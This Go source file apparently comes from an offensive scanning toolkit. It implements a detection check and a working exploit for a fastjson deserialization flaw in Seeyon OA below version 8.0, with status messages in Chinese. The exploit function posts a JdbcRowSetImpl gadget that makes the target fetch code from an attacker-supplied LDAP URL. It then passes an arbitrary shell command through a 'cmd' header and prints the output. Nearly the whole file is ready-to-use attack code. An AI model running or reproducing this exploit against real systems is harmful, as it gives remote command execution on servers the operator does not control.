package vulners

import (
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"strings"
)

type Sy01 struct {
}

func (s *Sy01) Scan(targetUrl string) {
	vulnerable, err := sy01scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[+]存在seeyon<8.0_fastjson反序列化")
	} else {
		color.White("[-]不存在seeyon<8.0_fastjson反序列化")
	}
}

func (*Sy01) Exploit(targetUrl string) {
	s := strings.Split(targetUrl, "|")
	if len(s) != 3 {
		color.Red("[x]url参数格式不正确！")
		return
	}
	url := s[0]
	ldapUrl := s[1]
	command := s[2]
	runResult, err := sy01runcore(url, ldapUrl, command)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.White(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func sy01scancore(targetUrl string) (bool, error) {
	fastjson_payload := "_json_params={\"name\":\"S\",\"age\":21"
	req, err := http.NewRequest("POST", targetUrl+"/seeyon/main.do?method=changeLocale", strings.NewReader(fastjson_payload))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36")
	if err != nil {
		return false, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	resContent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}
	if (strings.Contains(string(resContent), "errorHandle")) && (strings.Contains(string(resContent), "syntax")) {
		return true, nil
	} else {
		return false, nil
	}
}

func sy01runcore(targetUrl string, ldapUril string, command string) (string, error) {
	runcorePayload := "_json_params={\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"" + ldapUril + "\",\"autoCommit\":true}"
	req, err := http.NewRequest("POST", targetUrl+"/seeyon/main.do?method=changeLocale", strings.NewReader(runcorePayload))
	if err != nil {
		return "", err
	}
	req.Header.Set("cmd", command)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	respContent, _ := ioutil.ReadAll(resp.Body)
	if strings.Contains(string(respContent), "parent.errorHandle") {
		return "", nil
	} else {
		return string(respContent), nil
	}
}
